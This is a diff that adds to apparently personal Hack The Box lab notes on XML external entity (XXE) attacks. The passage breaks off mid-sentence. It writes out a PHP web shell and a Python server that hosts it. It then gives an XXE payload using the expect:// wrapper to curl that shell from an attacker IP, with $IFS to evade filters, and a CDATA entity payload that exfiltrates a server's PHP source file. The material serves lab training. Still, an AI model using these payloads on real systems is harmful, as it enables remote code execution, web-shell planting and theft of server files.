@@ -35,3 +35,29 @@ Avalon112@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
 Avalon112@htb[/htb]$ sudo python3 -m http.server 80
 #Hosting WebServer
 ```
+Modifying XML Code:
+```
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]> #Using $IFS to avoid space, use of |, ? and {} should also be avoided
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
+
+Using CDATA to perform exfiltration:
+
+We can use CDATA to enclose filecontent, so that it would be considered raw data instead of being parsed, this method works without using the php filter:
+```
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+This alone would not work as XML does not allow 
